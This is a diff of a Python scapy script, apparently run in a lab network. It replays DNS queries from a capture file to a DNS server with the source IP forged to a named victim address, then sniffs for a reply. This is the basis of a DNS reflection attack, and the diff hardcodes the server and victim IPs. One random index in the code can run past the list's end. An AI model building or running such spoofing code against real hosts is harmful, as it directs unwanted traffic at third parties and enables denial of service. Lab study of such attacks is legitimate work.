@@ -31,16 +31,20 @@ def handle_pkt(pkt):
 
 def main():
     
-    if len(sys.argv)<4:
-        print('pass 3 argument: <dns_ip> <victim_ip> "<file.pcap>"')
-        exit(1)
+    #if len(sys.argv)<4:
+    #    print('pass 3 argument: <dns_ip> <victim_ip> "<file.pcap>"')
+    #    exit(1)
 
-    addr = socket.gethostbyname(sys.argv[1])
-    vic_addr = socket.gethostbyname(sys.argv[2])
+    #addr = socket.gethostbyname(sys.argv[1])
+    #vic_addr = socket.gethostbyname(sys.argv[2])
+    addr = "10.0.3.3"
+    vic_addr = "10.0.2.2"
+    
     iface = get_if()
     print("iface: ", iface)
 
-    pcap = rdpcap(sys.argv[3])
+    #pcap = rdpcap(sys.argv[3])
+    pcap = rdpcap("dns0313_2_onlyDNS.pcapng")
 
     q_pkt = []
     for pkt in pcap:
@@ -51,10 +55,11 @@ def main():
     pkt = pkt /IP(dst=addr, src=vic_addr) / UDP(dport=53, sport=random.randint(49152,65535)) / q_pkt[random.randint(0, len(q_pkt))].getlayer(DNS)
     sendp(pkt, iface = iface, verbose=False)
 
-    print pkt[DNS].show()
-    #sniff(iface = iface, 
-    #        prn = lambda x: handle_pkt(x),
-    #        count = 1)
+    print pkt.show()
+    print "----"
+    sniff(iface = iface, 
+            prn = lambda x: handle_pkt(x),
+            count = 1)
 
 
 if __name__ == '__main__':
